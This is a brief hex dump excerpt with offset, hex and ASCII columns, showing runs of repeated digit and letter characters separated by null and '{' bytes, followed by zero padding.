5060: 3131 3100 7b00 3232 3232 3232 3232 3232   111.{.2222222222
5070: 3232 3232 3200 7b00 3333 3333 3333 3333   22222.{.33333333
5080: 3333 3333 3333 3300 7b00 3434 3434 3434   3333333.{.444444
5090: 3434 3434 3434 3434 3400 7b00 3535 3535   444444444.{.5555
50a0: 3535 3535 3535 3535 3535 3500 7b00 3636   55555555555.{.66
50b0: 3636 3636 3636 3636 3636 3636 3600 7b00   6666666666666.{.
50c0: 3737 3737 3737 3737 3737 3737 3737 3700   777777777777777.
50d0: 7b00 3838 3838 3838 3838 3838 3838 3838   {.88888888888888
50e0: 3800 7b00 3939 3939 3939 3939 3939 3939   8.{.999999999999
50f0: 3939 3900 7b00 6161 6161 6161 6161 6161   999.{.aaaaaaaaaa
5100: 6161 6161 6100 7b00 0000 0000 0000 0000   aaaaa.{.........
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................
